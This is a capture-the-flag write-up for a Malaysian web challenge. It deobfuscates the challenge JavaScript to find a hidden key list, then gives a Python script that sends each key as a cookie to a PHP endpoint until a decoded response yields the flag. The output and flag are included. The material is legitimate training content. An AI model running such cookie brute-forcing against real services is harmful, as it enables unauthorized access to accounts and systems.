# Pintu Gerbang 🕸️

## Description
> Tuah baru sahaja tiba di Selangor, dan bercadang untuk berehat di sebuah masjid di Selangor. Namun, perjalanan itu jauh, dan Tuah terjumpa sebuah pintu gerbang misteri yang mungkin boleh membawanya terus ke masjid tersebut. Walau bagaimanapun, pintu gerbang tersebut terkunci. Tuah perlu mencari cara untuk membuka pintu gerbang ini bagi meneruskan perjalanannya.
> 
> https://4219844b4c.bahterasiber.my

## Challenge Overview
```js
var _0x5deaf3 = _0x4390;
(function (_0x3ec5ae, _0x971b41) {
    var _0x383ab5 = _0x4390,
        _0x186466 = _0x3ec5ae();
    while (!![]) {
        try {
            var _0x49850d = -parseInt(_0x383ab5(0xff)) / 0x1 + -parseInt(_0x383ab5(0xf0)) / 0x2 + parseInt(_0x383ab5(0xf2)) / 0x3 * (-parseInt(_0x383ab5(0xf9)) / 0x4) + -parseInt(_0x383ab5(0xf1)) / 0x5 + parseInt(_0x383ab5(0xf6)) / 0x6 + -parseInt(_0x383ab5(0xf7)) / 0x7 + parseInt(_0x383ab5(0xe5)) / 0x8 * (parseInt(_0x383ab5(0xeb)) / 0x9);
            if (_0x49850d === _0x971b41) break;
            else _0x186466['push'](_0x186466['shift']());
        } catch (_0x2ccc1e) {
            _0x186466['push'](_0x186466['shift']());
        }
    }
}(_0x3155, 0x22b59));

function getSessionPath() {
    var _0x83474e = _0x4390;
    return _0x83474e(0xf5);
}

function getGateKey() {
    var _0x2ffb13 = _0x4390,
        _0x2b91fb = new XMLHttpRequest();
    _0x2b91fb['open'](_0x2ffb13(0xe7), _0x2ffb13(0xf4), !![]), _0x2b91fb[_0x2ffb13(0xfc)](_0x2ffb13(0xe6), 'application/x-www-form-urlencoded'), _0x2b91fb[_0x2ffb13(0xe8)] = function () {
        var _0x215b46 = _0x2ffb13;
        _0x2b91fb[_0x215b46(0xec)] !== 0xc8 && console['log'](_0x215b46(0xfd));
    }, _0x2b91fb['send']();
}

function computeHash(_0xb75b35) {
    var _0x42d35e = _0x4390,
        _0x1220c3 = 0x0;
    for (var _0x2b6c7e = 0x0; _0x2b6c7e < _0xb75b35[_0x42d35e(0x102)]; _0x2b6c7e++) {
        _0x1220c3 += _0xb75b35[_0x42d35e(0xfe)](_0x2b6c7e) * 0x3 % 0x100;
    }
    return console['log'](_0x42d35e(0xe9), _0x1220c3), _0x1220c3;
}

function simulateDelay(_0x40a570) {
    setTimeout(function () {
        var _0x54f190 = _0x4390;
        console[_0x54f190(0xf8)](_0x54f190(0xfa)), typeof _0x40a570 === 'function' && _0x40a570();
    }, 0x5dc);
}

function generateRandomData(_0x47dd6b) {
    var _0x59fd4a = _0x4390,
        _0x19f7a7 = [];
    for (var _0x3607e4 = 0x0; _0x3607e4 < _0x47dd6b; _0x3607e4++) {
        _0x19f7a7[_0x59fd4a(0x101)](Math[_0x59fd4a(0xef)](_0x3607e4) * 0x64);
    }
    return console[_0x59fd4a(0xf8)]('Generated Data:', _0x19f7a7), _0x19f7a7;
}

function calculateSquare(_0x43e352) {
    var _0x23551f = Math['pow'](_0x43e352, 0x2);
    return console['log']('Calculated Square:', _0x23551f), _0x23551f;
}

function obfuscateString(_0x4bbcb7) {
    var _0x7ea55a = _0x4390,
        _0x184307 = _0x4bbcb7[_0x7ea55a(0x100)]('')['reverse']()[_0x7ea55a(0xee)]('');
    return console[_0x7ea55a(0xf8)](_0x7ea55a(0xfb), _0x184307), _0x184307;
}
computeHash(_0x5deaf3(0xf3)), simulateDelay(function () {
    var _0x327c0a = _0x5deaf3;
    console['log'](_0x327c0a(0xea));
}), generateRandomData(0xf), calculateSquare(0xa), obfuscateString('complexity'), getGateKey();

function _0x3155() {
    var _0x16552d = ['length', '16JOQhzV', 'Content-Type', 'POST', 'onload', 'Computed Hash:', 'Callback from simulateDelay', '1783962WUGaRA', 'status', 'shift', 'join', 'sin', '161348jmqDPA', '30560mOkTJY', '261FVoBpD', 'exampleInput', '/maklumat_kunci.php', '/s3N4r4I_kunc1.txt', '1276416ZfCPdV', '1413755luiuCd', 'log', '3564MyKJfp', 'Delay Simulation Completed', 'Obfuscated String:', 'setRequestHeader', 'Kunci tidak disediakan atau tidak sah!', 'charCodeAt', '100735IwYsIA', 'split', 'push'];
    _0x3155 = function () {
        return _0x16552d;
    };
    return _0x3155();
}

function _0x4390(_0x53a517, _0x524d79) {
    var _0x31558c = _0x3155();
    return _0x4390 = function (_0x43906c, _0x5a0f21) {
        _0x43906c = _0x43906c - 0xe5;
        var _0x43d2e2 = _0x31558c[_0x43906c];
        return _0x43d2e2;
    }, _0x4390(_0x53a517, _0x524d79);
}

function getCookie(_0x322a62) {
    var _0x27961c = _0x5deaf3,
        _0x59fc67 = '; ' + document['cookie'],
        _0x16c81d = _0x59fc67[_0x27961c(0x100)]('; ' + _0x322a62 + '=');
    if (_0x16c81d[_0x27961c(0x102)] == 0x2) return _0x16c81d['pop']()['split'](';')[_0x27961c(0xed)]();
}
```
```
                [SNIPPED]
kunci=a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
kunci=b5a1d2e3c4f6e7a8b9c0d1e2f3a4b5c6
kunci=c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6
kunci=d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7
kunci=e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8
kunci=f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9
kunci=a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0
                [SNIPPED]
```
The goal of the script is to brute-force a kunci value from a list of potential values, send each kunci to a server, and extract a hexadecimal number from the server's response. We then decode the hexadecimal number and check if the decoded string starts with the specific prefix 3108{
```py
import requests
import re
import binascii

# Set the URL for the request
url = "https://4219844b4c.bahterasiber.my/maklumat_kunci.php"

# Read kunci values from the text file
with open('s3N4r4I_kunc1.txt', 'r') as file:
    kunci_values = file.readlines()

# Iterate over each kunci value
for kunci in kunci_values:
    kunci = kunci.strip()  # Remove any leading/trailing whitespace

    # Set up headers including the kunci value in the cookie
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': kunci
    }

    # Send the POST request
    response = requests.post(url, headers=headers)

    # Check if the response contains the hexadecimal number
    match = re.search(r'ke <b>([0-9a-fA-F]+)</b>', response.text)
    if match:
        hex_number = match.group(1)
        print(f'Hex found for kunci: {kunci} -> {hex_number}')

        # Decode the hex number to a string
        try:
            decoded_string = binascii.unhexlify(hex_number).decode('utf-8')
            print(f'Decoded string: {decoded_string}')

            # Check if the decoded string starts with '3108{'
            if decoded_string.startswith('3108'):
                print(f'Success! Found matching string: {decoded_string}')
                break
        except binascii.Error:
            print(f'Failed to decode hex: {hex_number}')
    else:
        continue
```


![image](https://github.com/user-attachments/assets/5a7275a4-c270-4f18-8d92-6479c12864a1)

![image](https://github.com/user-attachments/assets/04ee2f45-0cfd-49d4-9ac1-33636f210503)
![image](https://github.com/user-attachments/assets/f3e6d884-b229-49ed-b0fd-07c3f7dd8fd5)

![image](https://github.com/user-attachments/assets/3bc1d0c2-576c-46ca-b24e-1723fa0d6462)

```
Hex found for kunci: kunci=a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 -> 53756e776179204c61676f6f6e
Decoded string: Sunway Lagoon
Hex found for kunci: kunci=b5a1d2e3c4f6e7a8b9c0d1e2f3a4b5c6 -> 492d43697479
Decoded string: I-City
Hex found for kunci: kunci=c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6 -> 4b6c616e6720506172616465
Decoded string: Klang Parade
Hex found for kunci: kunci=d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7 -> 41454f4e204d616c6c205368616820416c616d
Decoded string: AEON Mall Shah Alam
Hex found for kunci: kunci=e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8 -> 536b797061726b205465726d696e616c
Decoded string: Skypark Terminal
Hex found for kunci: kunci=a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0 -> 4d757a69756d204b656e616e67616e
Decoded string: Muzium Kenangan
Hex found for kunci: kunci=c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2 -> 42617475204361766573
Decoded string: Batu Caves
Hex found for kunci: kunci=d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3 -> 546865204d696e6573
Decoded string: The Mines
Hex found for kunci: kunci=e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4 -> 4b4c4941
Decoded string: KLIA
Hex found for kunci: kunci=f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5 -> 42616e6461722042756b69742054696e676769
Decoded string: Bandar Bukit Tinggi
Hex found for kunci: kunci=7c2d6e8a1b1c8e4e6f1b5a5e1a2c8b7d -> 4d61736a69642053756c74616e2053616c6168756464696e20416264756c20417a697a2053686168
Decoded string: Masjid Sultan Salahuddin Abdul Aziz Shah
```
## Flag
```
3108{e3d0d1d0f2f4d7fa73d3d3b9e06d7a23d3c749f63c8d4b3c582cf54e0de6c3e4}
```
